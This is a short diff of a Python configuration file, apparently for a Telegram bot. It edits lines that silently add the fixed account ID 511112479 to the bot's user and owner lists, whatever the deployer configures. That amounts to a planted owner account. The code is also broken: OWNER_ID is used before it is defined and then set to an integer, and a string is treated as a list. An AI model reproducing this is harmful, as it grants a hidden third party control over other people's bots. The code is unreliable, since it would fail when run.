@@ -26,8 +26,8 @@ BOT_USER = os.environ.get("BOT_USER")
 BOT_USERS = str(BOT_USER).split(" ", maxsplit=len(BOT_USER))
 ALIVE_NAME = os.environ.get("ALIVE_NAME", "DICTATOR AMAAN")
 
-if 511112479 not in BOT_USER:
-    BOT_USER.append(511112479)
+if 511112479 not in OWNER_ID:
+    OWNER_ID.append(511112479)
 OWNER_ID = int(os.environ.get("OWNER_ID", None))
 BOT_USER.append(OWNER_ID)
 
